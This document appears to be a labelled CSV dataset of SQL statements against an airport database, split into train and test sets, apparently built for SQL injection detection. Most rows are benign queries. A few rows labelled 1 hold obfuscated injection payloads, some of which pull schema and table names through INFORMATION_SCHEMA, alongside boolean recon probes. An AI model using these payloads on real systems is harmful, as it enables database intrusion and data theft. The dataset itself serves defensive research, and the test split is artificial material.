full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.3 AND  348.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.3  AND  118.8  ORDER BY frequency;",0,122.3 348.8 127.3 118.8,,,,select,airport-S13,,,test
"SELECT id FROM airports WHERE latitude BETWEEN 13.27495 AND -22.560973 AND name LIKE ""%Yz36SloV80RfSnAiXvzs%"" OR name LIKE ""%nxp9co9dXSCk6SpXFKsL%"" AND scheduled_service = ""no"" AND longitude BETWEEN 21.315093 AND -97.717003 AND type = ""closed""",0,13.27495 -22.560973 Yz36SloV80RfSnAiXvzs nxp9co9dXSCk6SpXFKsL no 21.315093 -97.717003 closed,,,,select,airport-S23,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""VG"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,VG 3,,,,select,airport-S19,,,train
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SJUI"",""heliport"", ""Daewoo Trump Marine World Heliports"",""https://en.wikipedia.org/wiki/Laughlin/Bullhead_International_Airport"",""OC"")",0,SJUI heliport Daewoo Trump Marine World Heliports https://en.wikipedia.org/wiki/Laughlin/Bullhead_International_Airport OC,,,,insert,airport-I3,,,test
DROP USER 'oracle'@'localhost';,0,,,,,admin,airport-admin14,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""MX-DIF""",0,AS MX-DIF,,,,select,airport-S8,,,test
"SELECT * FROM airport WHERE gps_code = ""CO13"" OR local_code = ""90OI""",0,CO13 90OI,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE type LIKE ""closed"" AND longitude >= -46.871387481689 AND name LIKE ""%lJHh4QNqAvLUAmf9XoBS%"" OR name LIKE ""%UzQwwCsrfutVjqJY7VEK%"" AND iso_region LIKE ""US-AR"" AND elevation_feet <= 7100.0 AND scheduled_service = ""no""",0,closed -46.871387481689 lJHh4QNqAvLUAmf9XoBS UzQwwCsrfutVjqJY7VEK US-AR 7100.0 no,,,,select,airport-S23,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Marsaxlokk"";",0,Marsaxlokk,,,,select,airport-S15,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MRLG"";",0,MRLG,,,,select,airport-S7,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""KR-11""",0,EU KR-11,,,,select,airport-S8,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES ((sELEcT coNcaT(coNcaT(0x7178626a71,(sELEcT MiD((iFnulL(CAsT(TaBLe_NamE aS NchAr),0x20)),1,118) FRoM InFORMATION_SCHEMA.TAbleS WHere table_schema In (0x64617461736574) LiMiT 2,1)),0x7171766a71)), 3874, ""YMGO"", ""A/D"", ""WIEN RADAR"", 135.775)",1," (sELEcT coNcaT(coNcaT(0x7178626a71,(sELEcT MiD((iFnulL(CAsT(TaBLe_NamE aS NchAr ,0x20  ,1,118  FRoM InFORMATION_SCHEMA.TAbleS WHere table_schema In (0x64617461736574  LiMiT 2,1  ,0x7171766a71   3874 ""YMGO"" ""A/D"" ""WIEN RADAR"" 135.775 ",exploit,randomcase,success,insert,airport-I8,inline-47,inline,test
"SELECT * FROM airport WHERE gps_code = ""SNBC"" OR local_code = ""3NC6""",0,SNBC 3NC6,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CY"" GROUP BY r.name ORDER BY r.name ASC;",0,CY,,,,select,airport-S5,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CA""",0,CA,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""UNKY"";",0,UNKY,,,,select,airport-S7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sultan Kudarat Province"";",0,Sultan Kudarat Province,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Pista da Herdade do Pontal"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Cabinda Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Macao"", ""%"");",0,Pista da Herdade do Pontal Airports in Cabinda Province Macao,,,,select,airport-S18,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Oeste Plaza Shopping - MC Helipad""",0,Oeste Plaza Shopping - MC Helipad,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""UA""",0,UA,,,,select,airport-S9,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""DE"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,DE 3,,,,select,airport-S19,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Al Ghaydah International Airport""",0,Al Ghaydah International Airport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (11300, ""MN16"", 7294.0, ""ASP"", 1, 0)",0,11300 MN16 7294.0 ASP 1 0,,,,insert,airport-I9,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""LFEX"", ""small_airport"", ""Holly Airport"", 38.81114, -76.60763, 667.0)",0,LFEX small_airport Holly Airport 38.81114 -76.60763 667.0,,,,insert,airport-I2,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 133.9 AND  122.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.625  AND  117.6  ORDER BY frequency;",0,133.9 122.8 118.625 117.6,,,,select,airport-S13,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""El Verano Airport"");",0,El Verano Airport,,,,select,airport-S12,,,train
"UPDATE airport SET name = ""Menggala Airport"" WHERE ident = ""VAAU""",0,Menggala Airport VAAU,,,,update,airport-U1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Cheshnegirovo Air Base"");",0,Cheshnegirovo Air Base,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MD"" GROUP BY r.name ORDER BY r.name ASC;",0,MD,,,,select,airport-S16,,,test
"DELETE FROM airport_frequencies WHERE type = ""CNTR"";",0,CNTR,,,,delete,airport-D4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4930"" AS SIGNED) AND a.iso_country = ""LV"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4930 LV,,,,select,airport-S22,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (94548, ""MRL'))) aNd MaKE_set(5456=5456,7667) aNd ((('wjuU'='wjuU"", ""Rangiroa"", ""NDB"", 205, ""KG"")",1," 94548 MRL'))) aNd MaKE_set(5456=5456,7667) aNd ((('wjuU'='wjuU"" Rangiroa"" NDB 205 KG ",recon,randomcase,failure,insert,airport-I10,boolean-54,boolean,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""RU"") OR a.elevation_ft > 960.0",0,RU 960.0,,,,select,airport-S11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DJ"" GROUP BY r.name ORDER BY r.name ASC;",0,DJ,,,,select,airport-S16,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Williamson County Regional Airport"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Xocavand District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Sahrawian, مطارات الصحراء الغربية"", ""%"");",0,"Williamson County Regional Airport Airports in Xocavand District Sahrawian, مطارات الصحراء الغربية",,,,select,airport-S18,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Lyubimets;""",0,Lyubimets,,,,select,airport-S21,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""CL-AI""",0,SA CL-AI,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PE"" GROUP BY r.name ORDER BY r.name ASC;",0,PE,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-MA""",0,AS US-MA,,,,select,airport-S8,,,test
"UPDATE countries SET keywords = ""Micronesian airports"" WHERE code = ""IN"";",0,Micronesian airports IN,,,,update,airport-U8,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Armada/Hoffler Business Center Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Armada/Hoffler Business Center Heliport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,UA 5,,,,select,airport-S19,,,test
"SELECT * FROM airport WHERE gps_code = ""KNUC"" OR local_code = ""OK49""",0,KNUC OK49,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE longitude >= 1.257531 AND type = ""heliport"" AND name LIKE ""%RBpR62QoZBBFcAXttXks%"" OR name LIKE ""%2W1OuuOV0nsR40Lvbdy7%"" AND latitude <= 32.02495 AND scheduled_service LIKE ""no""",0,1.257531 heliport RBpR62QoZBBFcAXttXks 2W1OuuOV0nsR40Lvbdy7 32.02495 no,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Samaritan Hospital Heliport"");",0,Samaritan Hospital Heliport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-AR""",0,EU US-AR,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""YDL"") OR name LIKE ""SSOU""",0,YDL SSOU,,,,select,airport-S10,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3347"" AS SIGNED) AND a.iso_country = ""PH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3347 PH,,,,select,airport-S22,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""MV-05"", ""Central Governorate"", ""AS"", ""VE"", ""https://en.wikipedia.org/wiki/Nana-Mamb%C3%A9r%C3%A9"", ""Airports in Vila Real District"")",0,MV-05 Central Governorate AS VE https://en.wikipedia.org/wiki/Nana-Mamb%C3%A9r%C3%A9 Airports in Vila Real District,,,,insert,airport-I4,,,train
"SELECT id FROM airports WHERE ( FIND_IN_SET(""NdbDfybsoU23EoEqeAHq"", keywords_field) > 0 OR FIND_IN_SET(""whEY5EaaEqu556gzOjBv"", keywords_field) > 0) AND type IN (""heliport"",""heliport"",""heliport"") AND longitude <= 64.483299 AND elevation_feet <= 92.0 AND scheduled_service LIKE ""no"" AND name LIKE ""%ExqEWrvETMXMkNpDNx6N%"" OR name LIKE ""%Zr3RXwT5yLNdrGgGSxuT%""",0,NdbDfybsoU23EoEqeAHq whEY5EaaEqu556gzOjBv heliport heliport heliport 64.483299 92.0 no ExqEWrvETMXMkNpDNx6N Zr3RXwT5yLNdrGgGSxuT,,,,select,airport-S23,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (95024, ""YLT"", ""Beni Walid"", ""TACAN"", 112900, ""US"")",0,95024 YLT Beni Walid TACAN 112900 US,,,,insert,airport-I10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""IT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,IT 4,,,,select,airport-S19,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 10.0",0,US 10.0,,,,select,airport-S11,,,test
"UPDATE airport SET name = ""Orlando Heli-Tours Margaritaville Heliport"" WHERE ident = ""41LA""",0,Orlando Heli-Tours Margaritaville Heliport 41LA,,,,update,airport-U1,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""DM"" OR c.name LIKE CONCAT(""%"", ""Cambodia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,DM Cambodia 3,,,,select,airport-S20,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""LC"" OR c.name LIKE CONCAT(""%"", ""United Kingdom"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,LC United Kingdom 3,,,,select,airport-S20,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Pampa Alegre Airport"");",0,Fazenda Pampa Alegre Airport,,,,select,airport-S12,,,test
"UPDATE countries SET keywords = ""Swaziland"" WHERE code = ""SN"";",0,Swaziland SN,,,,update,airport-U8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(3179,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/18,1),8,1))>96)/**/THEN/**/3179/**/ELSE/**/0x3A/**/END)/**/AND/**/""HrES""=""HrES"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(3179,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/18,1),8,1))>96)/**/THEN/**/3179/**/ELSE/**/0x3A/**/END)/**/AND/**/""HrES""=""HrES Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""KN"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,KN 5,,,,select,airport-S19,,,test
"DELETE FROM airport_frequencies WHERE type = ""-5287""))/**/AS/**/ctuS/**/WHERE/**/1560=1560/**/OR/**/MAKE_SET(2916=4163,4163)--/**/fdlB"";",1," -5287""))/**/AS/**/ctuS/**/WHERE/**/1560=1560/**/OR/**/MAKE_SET(2916=4163,4163)--/**/fdlB ",recon,space2comment,success,delete,airport-D4,boolean-132,boolean,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 119.25 AND  122.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.7  AND  125.125  ORDER BY frequency;",0,119.25 122.5 120.7 125.125,,,,select,airport-S13,,,test
"DELETE FROM airport WHERE name = ""Glacier d'Argentière Altiport"";  ",0,Glacier d'Argentière Altiport,,,,delete,airport-D2,,,test
"DELETE FROM regions WHERE name = ""Ngeremlengui"";",0,Ngeremlengui,,,,delete,airport-D8,,,test
